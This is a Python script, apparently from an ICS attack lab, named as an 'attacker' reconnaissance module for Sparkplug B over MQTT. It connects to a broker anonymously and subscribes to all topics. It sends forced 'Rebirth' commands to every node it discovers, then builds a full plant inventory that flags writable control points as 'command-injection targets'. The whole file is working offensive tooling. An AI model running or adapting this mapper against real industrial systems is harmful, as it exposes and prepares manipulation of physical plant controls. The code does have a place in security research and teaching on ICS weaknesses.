"""
Passive plant mapping via Sparkplug BIRTH certificates.

Connect anonymously, subscribe to the entire namespace, and let the edge nodes
hand us a complete, authoritative inventory of the plant: every group, node,
device, metric, datatype, engineering unit, live value, and — crucially — which
metrics are writable and what alias each one uses.

No scanning. No fuzzing. The protocol is self-describing by design.

Usage:
    python -m attacker.recon [--host HOST] [--seconds N]
"""

import argparse
import os
import time

import paho.mqtt.client as mqtt

from common import sparkplug as spb
from common.sparkplug import DATATYPE_NAMES

inventory = {}     # device_key -> list of metric dicts
writable = []      # (topic, metric, alias, datatype)
_seen_wr = set()   # dedupe writable across repeated BIRTHs
nodes = set()      # discovered (group, node)


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"[+] Connected ANONYMOUSLY to broker, no creds required (rc={rc})")
        client.subscribe("spBv1.0/#")
        print("[+] Subscribed to spBv1.0/#  (listening for BIRTH certificates)\n")
    else:
        print(f"[-] Connect failed rc={rc}")


def force_rebirth(client):
    """BIRTHs aren't retained, so make every node we've seen re-announce."""
    from common.sparkplug import DataType as DT
    for group, node in list(nodes):
        p = spb.new_payload(seq=0)
        spb.add_metric(p, name="Node Control/Rebirth", datatype=DT.Boolean, value=True)
        client.publish(spb.topic(group, "NCMD", node), spb.encode(p), qos=0)
    if nodes:
        print(f"[+] Sent rebirth to {len(nodes)} node(s) to harvest fresh BIRTHs\n")


def on_message(client, userdata, msg):
    parts = msg.topic.split("/")
    if len(parts) < 4:
        return
    # note every node we see, from any message type
    nodes.add((parts[1], parts[3]))
    if parts[2] not in ("NBIRTH", "DBIRTH"):
        return
    group, mtype, node = parts[1], parts[2], parts[3]
    device = parts[4] if len(parts) >= 5 else "(node)"
    key = f"{group}/{node}/{device}"
    try:
        payload = spb.decode(msg.payload)
    except Exception:
        return

    metrics = []
    for m in payload.metrics:
        dt = DATATYPE_NAMES.get(m.datatype, str(m.datatype))
        val = spb.get_metric_value(m)
        unit = spb.get_property(m, "engUnit")
        w = spb.get_property(m, "writable")
        metrics.append({"name": m.name, "alias": m.alias, "type": dt,
                        "value": val, "unit": unit, "writable": w})
        if w:
            cmd_type = "NCMD" if device == "(node)" else "DCMD"
            cmd_topic = f"spBv1.0/{group}/{cmd_type}/{node}"
            if device != "(node)":
                cmd_topic += f"/{device}"
            wr_key = (cmd_topic, m.name)
            if wr_key not in _seen_wr:
                _seen_wr.add(wr_key)
                writable.append((cmd_topic, m.name, m.alias, dt))
    inventory[key] = metrics


def dump():
    print("=" * 72)
    print(" PLANT INVENTORY  (harvested from Sparkplug BIRTH certificates)")
    print("=" * 72)
    for key, metrics in sorted(inventory.items()):
        print(f"\n  ▸ {key}")
        for m in metrics:
            flag = "  [WRITABLE]" if m["writable"] else ""
            unit = f" {m['unit']}" if m["unit"] else ""
            alias = f"alias={m['alias']}" if m["alias"] else "alias=-"
            print(f"      {m['name']:<32} {str(m['value']):>10}{unit:<6} "
                  f"({m['type']}, {alias}){flag}")

    print("\n" + "=" * 72)
    print(" WRITABLE CONTROL POINTS  (candidate command-injection targets)")
    print("=" * 72)
    if not writable:
        print("  (none seen yet)")
    for topic, name, alias, dt in writable:
        print(f"  publish -> {topic}")
        print(f"             metric={name!r} (alias={alias}, {dt})")
    print()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=os.environ.get("MQTT_HOST", "localhost"))
    ap.add_argument("--port", type=int, default=int(os.environ.get("MQTT_PORT", "1883")))
    ap.add_argument("--seconds", type=int, default=6)
    args = ap.parse_args()

    c = mqtt.Client(client_id="mapper-01")
    c.on_connect = on_connect
    c.on_message = on_message
    c.connect(args.host, args.port, keepalive=30)
    c.loop_start()
    time.sleep(max(1.5, args.seconds * 0.4))  # learn which nodes exist
    force_rebirth(c)
    time.sleep(max(1.5, args.seconds * 0.6))  # collect the fresh BIRTHs
    c.loop_stop()
    dump()


if __name__ == "__main__":
    main()
